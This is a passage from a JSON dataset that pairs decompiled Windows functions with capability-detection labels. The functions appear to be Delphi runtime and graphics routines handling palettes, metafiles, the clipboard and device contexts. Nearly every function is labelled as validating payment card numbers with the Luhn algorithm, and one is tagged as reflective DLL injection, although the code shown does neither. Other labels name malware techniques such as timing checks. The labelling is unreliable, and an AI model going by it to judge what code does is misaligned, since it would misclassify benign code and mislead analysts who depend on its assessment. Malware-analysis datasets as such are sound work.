        "decompiled_code": "\nvoid __fastcall fcn.00426fb8(uint param_1, uint *param_2)\n\n{\n    fcn.00426d80(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 46
    },
    "004270cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004270cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.0042706c();\n            fcn.00426f94();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00426fb8();\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "0042739c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042739c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x427438;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.00404838();\n            fcn.0040c8dc();\n            fcn.00403fc0();\n            goto code_r0x0042741f;\n        }\n    }\n    fcn.00427348();\ncode_r0x0042741f:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.004045c8(0x42743f);\n    return;\n}\n",
        "token_count": 290
    },
    "004275d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004275d4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U);\n    if (uVar1 < 0) {\n        uVar1 = uVar1 + 7;\n    }\n    return in_EAX * param_2 & 0xffffffff00000000U | uVar1 >> 3;\n}\n",
        "token_count": 128
    },
    "0042787c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042787c(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "004278c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004278c4(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.004031a8();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00427990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427990(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x4279bc;\n    fcn.00402d34();\n    uStack1044 = 0;\n    puStack1048 = 0x4279c3;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x427a8d;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.00427990::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.00427990::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.00427990::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x427a94);\n    return;\n}\n",
        "token_count": 477
    },
    "00427e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427e08(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 388
    },
    "004281ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.004281ac(void)\n\n{\n    uint16_t *in_EAX;\n    uint32_t uVar1;\n    uint16_t *puStack8;\n    \n    uVar1 = 0;\n    for (puStack8 = in_EAX; puStack8 < in_EAX + 10; puStack8 = puStack8 + 1) {\n        uVar1 = uVar1 ^ *puStack8;\n    }\n    return CONCAT44(in_EAX + 10, uVar1);\n}\n",
        "token_count": 112
    },
    "004282b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004282b8(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.004281d4();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 235
    },
    "004285f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004285f4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0042869c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042869c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.00428644(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 101
    },
    "004289d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004289d4(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x4289eb;\n        fcn.00403b58();\n    }\n    uStack52 = 0x428ab1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.004037f0();\n    uVar2 = 0;\n    uVar1 = *0x425028;\n    fcn.0040675c();\n    fcn.00428b54(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x425028;\n    fcn.0040675c();\n    fcn.00428b54(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x4252ac;\n    fcn.0040675c();\n    fcn.00428b54(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x425168;\n    fcn.0040675c();\n    fcn.00428b54(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.004045ec(0x428ab8);\n    return;\n}\n",
        "token_count": 381
    },
    "00428b54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428b54(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x428bd7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = fcn.004053a0();\n    fcn.00408a4c();\n    fcn.0040461c();\n    *puVar1 = arg_8h;\n    fcn.0040461c();\n    puVar1[3] = arg_ch;\n    fcn.0041c358();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x428bde;\n    uStack36 = 0x428bd6;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 240
    },
    "00428cd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00428cd8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 8) = uVar1;\n    fcn.00428d84();\n    fcn.00428d84();\n    fcn.00428d84();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 213
    },
    "00428d84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428d84(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x428d9f;\n    fcn.0041c358();\n    uStack32 = 0x428dc8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0041c358();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 143
    },
    "00428e2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00428e2c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.00428dec();\n    fcn.00428e0c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "00429318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429318(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x429240;\n    fcn.0042929c(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 88
    },
    "004293d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004293d4(uint arg_8h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack44 = 0x4293ea;\n        fcn.00403b58();\n    }\n    uStack48 = 0x429444;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.004298ac();\n    arg_ch = 0;\n    fcn.00429914();\n    uVar1 = 0;\n    fcn.0042946c(0, arg_ch, arg_8h);\n    *in_FS_OFFSET = uVar1;\n    fcn.004045ec(0x42944b);\n    return;\n}\n",
        "token_count": 230
    },
    "00429710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00429710(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004285f4();\n    *(in_EAX + 0xb) = 1;\n    *(in_EAX + 0x21) = 1;\n    (**(*in_EAX + 8))();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 176
    },
    "00429c18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429c18(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x429c2c;\n    fcn.00429b84();\n    puStack124 = 0x429c3b;\n    fcn.0041ebbc();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x429c49;\n        fcn.0042733c();\n    }\n    puStack124 = 0x429c51;\n    uVar2 = fcn.00402b14();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x429cd8;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00402d34();\n    fcn.0041ebbc();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.0042733c();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x429cdf;\n    fcn.00402b44();\n    return;\n}\n",
        "token_count": 474
    },
    "00429e68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429e68(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x429f0f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x429eed;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.00409188();\n    fcn.0040d5dc();\n    fcn.004049d4();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.004288c0();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 302
    },
    "00429f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429f48(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack108 [12];\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    \n    if (param_2 != 0) {\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileHeader(param_2, 100, auStack108);\n        if (iVar1 == 0) {\n            fcn.0042733c();\n        }\n    }\n    fcn.0042a19c();\n    if (*(in_EAX[10] + 8) != 0) {\n        sub.gdi32.dll_DeleteEnhMetaFile(*(in_EAX[10] + 8));\n    }\n    fcn.00425384();\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 8) = param_2;\n    *(iVar1 + 0x1c) = 0;\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != 0) {\n        *(iVar1 + 0xc) = iStack88 - iStack96;\n        *(iVar1 + 0x10) = iStack84 - iStack92;\n    }\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 366
    },
    "0042a474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.0042a474(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.0042730c();\n    }\n    fcn.00429b84();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 322
    },
    "0042a70c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042a70c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00426a54();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "0042a9cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a9cc(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x42aa02;\n        var_4h = param_2;\n        iVar1 = fcn.00427be4();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x42aa0f;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x42aa1b;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x42aa28;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x42aa7b;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.0042a9cc::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x42aa82);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "0042b44c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b44c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x42b46a;\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x42b53d;\n            fcn.0041cae8();\n            return;\n        }\n    }\n    uStack104 = 0x42b47a;\n    fcn.0042bb28();\n    uStack104 = 0x4858ac;\n    puStack108 = 0x42b484;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack112 = 0x42b50c;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.004031a8();\n        in_stack_ffffff80 = 0;\n        fcn.0042bd98(0, 0, &fcn.0042b44c::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.0042a900();\n        fcn.0042a904();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection_1(0x4858ac, 0x42b513);\n    return;\n}\n",
        "token_count": 512
    },
    "0042b544": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b544(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.0042b544::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x42b569;\n    fcn.0042bb28();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x42b5d3;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x485890) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.0042b138();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.0042aad4(*(in_EAX + 0x2c), &fcn.0042b544::var_5ch);\n    uVar3 = 0;\n    fcn.0042bd98(0, *(in_EAX + 0x28) & 0xffffff00 | *(*(in_EAX + 0x28) + 0x70), &fcn.0042b544::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 448
    },
    "0042b604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b604(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.0042b8f8();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040e630();\n    return;\n}\n",
        "token_count": 94
    },
    "0042b634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.0042b634(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.004037f0();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041ea14(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.0042bb28();\n    fcn.0040e630();\n    fcn.0042bd98(arg_8h, in_EAX[10] & 0xffffff00U | *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 276
    },
    "0042c428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
